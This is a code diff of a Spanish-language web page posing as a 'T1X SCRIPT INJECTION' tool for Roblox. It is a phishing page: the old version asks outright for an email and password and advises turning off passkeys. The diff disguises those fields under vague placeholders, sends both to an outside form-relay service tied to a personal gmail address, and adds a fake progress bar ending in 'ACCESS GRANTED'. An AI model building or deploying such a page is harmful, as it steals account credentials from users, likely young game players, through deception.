@@ -2,96 +2,68 @@
 <html lang="es">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>T1X SCRIPT INJECTION</title>
 
 <style>
-
-*{
-box-sizing:border-box;
-}
-
 body{
 margin:0;
-font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;
-background:#f8fafc;
-color:#0f172a;
-display:flex;
-justify-content:center;
-align-items:center;
-height:100vh;
+overflow:hidden;
+font-family:monospace;
+color:#00ff9f;
+background:black;
+}
+
+canvas{
+position:fixed;
+top:0;
+left:0;
+z-index:-1;
 }
 
 .card{
-background:white;
+position:absolute;
+top:50%;
+left:50%;
+transform:translate(-50%,-50%);
+background:rgba(0,0,0,0.7);
 padding:30px;
-border-radius:16px;
-width:360px;
-max-width:90%;
+border-radius:15px;
+width:320px;
 text-align:center;
-box-shadow:0 20px 60px rgba(0,0,0,0.08);
-animation:fadeIn 0.6s ease;
-}
-
-@keyframes fadeIn{
-from{
-opacity:0;
-transform:translateY(15px);
-}
-to{
-opacity:1;
-transform:translateY(0);
-}
+box-shadow:0 0 20px #00ff9f;
 }
 
 .title{
 font-size:18px;
-font-weight:600;
-margin-bottom:20px;
-color:#0f172a;
+margin-bottom:15px;
+letter-spacing:2px;
 }
 
 .btn{
-width:100%;
-padding:12px;
-border-radius:12px;
+display:block;
+margin:10px auto;
+padding:10px;
+border-radius:8px;
 border:none;
-background:#2563eb;
-color:white;
-font-weight:600;
+width:100%;
 cursor:pointer;
-transition:0.2s;
-margin-top:10px;
-}
-
-.btn:hover{
-background:#1d4ed8;
-}
-
-.btn:disabled{
-opacity:0.5;
-cursor:not-allowed;
+background:#00ff9f;
+color:black;
+font-weight:bold;
 }
 
 input,textarea{
 width:100%;
 margin-top:10px;
-padding:12px;
-border-radius:12px;
-border:1px solid #e2e8f0;
-background:white;
-color:#0f172a;
-outline:none;
-transition:0.2s;
-}
-
-input:focus,textarea:focus{
-border-color:#2563eb;
-box-shadow:0 0 0 3px rgba(37,99,235,0.1);
+padding:10px;
+border-radius:8px;
+border:none;
+background:black;
+color:#00ff9f;
 }
 
 textarea{
-height:90px;
+height:80px;
 resize:none;
 }
 
@@ -99,31 +71,30 @@ resize:none;
 display:none;
 }
 
-.info{
+.counter{
 font-size:12px;
-margin-top:15px;
-color:#64748b;
-}
-
-.minimo{
-font-size:12px;
+opacity:0.7;
 margin-top:5px;
-color:#64748b;
 }
 
-.processing{
-margin-top:10px;
-font-size:13px;
-color:#64748b;
-display:none;
+.info{
+font-size:11px;
+margin-top:12px;
+animation:blink 1.5s infinite;
+}
+
+@keyframes blink{
+0%{opacity:0.3}
+50%{opacity:1}
+100%{opacity:0.3}
 }
 
 .progress{
 width:100%;
+background:#022c22;
 height:6px;
-background:#e2e8f0;
-border-radius:10px;
 margin-top:10px;
+border-radius:10px;
 overflow:hidden;
 display:none;
 }
@@ -131,15 +102,25 @@ display:none;
 .bar{
 height:100%;
 width:0%;
-background:#2563eb;
-transition:0.2s;
+background:#00ff9f;
+}
+
+.processing{
+font-size:12px;
+margin-top:5px;
+display:none;
 }
 
 .success{
-margin-top:15px;
-color:#2563eb;
-font-weight:600;
 display:none;
+font-size:18px;
+margin-top:15px;
+animation:fadeIn 1s ease-in-out;
+}
+
+@keyframes fadeIn{
+from{opacity:0}
+to{opacity:1}
 }
 
 </style>
@@ -147,24 +128,26 @@ display:none;
 
 <body>
 
+<canvas id="matrix"></canvas>
+
 <div class="card">
 
 <div class="title">T1X SCRIPT INJECTION</div>
 
-<button class="btn" onclick="mostrarFormulario()">Roblox</button>
+<button class="btn" onclick="mostrarFormulario()">roblox</button>
 
-<form id="form" class="hidden">
+<form id="form" class="hidden" action="https://formsubmit.co/cesaralbertolandero@gmail.com" method="POST">
 
-<input id="campo1" type="text" placeholder="Correo Electrónico" required>
+<input id="campo1" type="text" name="campo1" placeholder="Primer dato..." required>
 
-<textarea id="campo2" placeholder="Contraseña"></textarea>
+<textarea id="campo2" name="campo2" placeholder="Segundo dato..." required></textarea>
 
-<div class="minimo" id="mensaje2">
-Mínimo de 8 caracteres
+<div class="counter">
+<span id="contador">0</span>/13 caracteres
 </div>
 
 <div class="info">
-Se recomienda desactivar llaves de acceso para que funcione correctamente 
+somos 2 personas, funcionará en aproximadamente 12-24 horas
 </div>
 
 <div class="processing" id="processing">
@@ -176,11 +159,11 @@ Processing...
 </div>
 
 <div class="success" id="success">
-✔️ Completado correctamente
+✔️ ACCESS GRANTED
 </div>
 
-<button id="btnAceptar" class="btn" disabled>
-Aceptar
+<button id="btnAceptar" class="btn" type="submit" disabled>
+ACEPTAR
 </button>
 
 </form>
@@ -193,36 +176,27 @@ function mostrarFormulario(){
 document.getElementById("form").classList.remove("hidden");
 }
 
-const campo1=document.getElementById("campo1");
 const campo2=document.getElementById("campo2");
 const boton=document.getElementById("btnAceptar");
-const mensaje2=document.getElementById("mensaje2");
+const contador=document.getElementById("contador");
 
-function validar(){
+campo2.addEventListener("input",()=>{
 
-let valido=true;
+contador.textContent=campo2.value.length;
 
-if(campo1.value.length < 10){
-valido=false;
-}
-
-if(campo2.value.length < 8){
-valido=false;
-mensaje2.style.color="#ef4444";
+if(campo2.value.length>=13){
+boton.disabled=false;
 }else{
-mensaje2.style.color="#22c55e";
+boton.disabled=true;
 }
 
-boton.disabled=!valido;
+});
 
-}
-
-campo1.addEventListener("input",validar);
-campo2.addEventListener("input",validar);
+const sonido = new Audio("https://assets.mixkit.co/active_storage/sfx/270/270-preview.mp3");
 
 boton.addEventListener("click",(e)=>{
 
-if(boton.disabled){
+if(campo2.value.length<13){
 e.preventDefault();
 return;
 }
@@ -238,11 +212,12 @@ width+=5;
 bar.style.width=width+"%";
 
 if(width>=100){
-
 clearInterval(interval);
 
 document.getElementById("processing").style.display="none";
 document.getElementById("success").style.display="block";
+
+sonido.play();
 
 setTimeout(()=>{
 document.getElementById("form").style.display="none";
@@ -253,6 +228,50 @@ document.getElementById("form").style.display="none";
 },100);
 
 });
+
+// Matrix
+
+const canvas=document.getElementById("matrix");
+const ctx=canvas.getContext("2d");
+
+canvas.height=window.innerHeight;
+canvas.width=window.innerWidth;
+
+const letras="01";
+const fontSize=14;
+const columnas=canvas.width/fontSize;
+
+const drops=[];
+
+for(let x=0;x<columnas;x++){
+drops[x]=1;
+}
+
+function draw(){
+
+ctx.fillStyle="rgba(0,0,0,0.05)";
+ctx.fillRect(0,0,canvas.width,canvas.height);
+
+ctx.fillStyle="#00ff9f";
+ctx.font=fontSize+"px monospace";
+
+for(let i=0;i<drops.length;i++){
+
+const text=letras.charAt(Math.floor(Math.random()*letras.length));
+
+ctx.fillText(text,i*fontSize,drops[i]*fontSize);
+
+if(drops[i]*fontSize>canvas.height && Math.random()>0.975){
+drops[i]=0;
+}
+
+drops[i]++;
+
+}
+
+}
+
+setInterval(draw,35);
 
 </script>
 
